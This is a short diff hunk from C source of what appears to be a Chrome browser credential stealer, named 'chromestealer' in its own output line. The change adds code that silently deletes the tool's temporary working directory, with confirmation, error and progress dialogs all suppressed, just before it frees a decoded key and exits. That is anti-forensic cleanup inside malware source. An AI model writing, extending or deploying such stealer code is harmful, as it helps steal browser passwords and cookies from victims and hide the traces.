@@ -466,12 +466,22 @@ int main(int argc, char *argv[]){
       }
     }else{
       //file isnt a sql database, just read it
-      
+
     }
     free(dest);
     free(src);
   };
-  
+  //delete our temp directory
+  SHFILEOPSTRUCTA op;
+  op.hwnd = NULL;
+  op.wFunc = FO_DELETE;
+  op.pFrom = tempPath;
+  op.pTo = NULL;
+  op.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;
+  op.fAnyOperationsAborted = FALSE;
+  op.hNameMappings = NULL;
+  op.lpszProgressTitle = NULL;
+  SHFileOperationA(&op);
   printf("chromestealer run done");
   free(decodedKey);
   return 0;
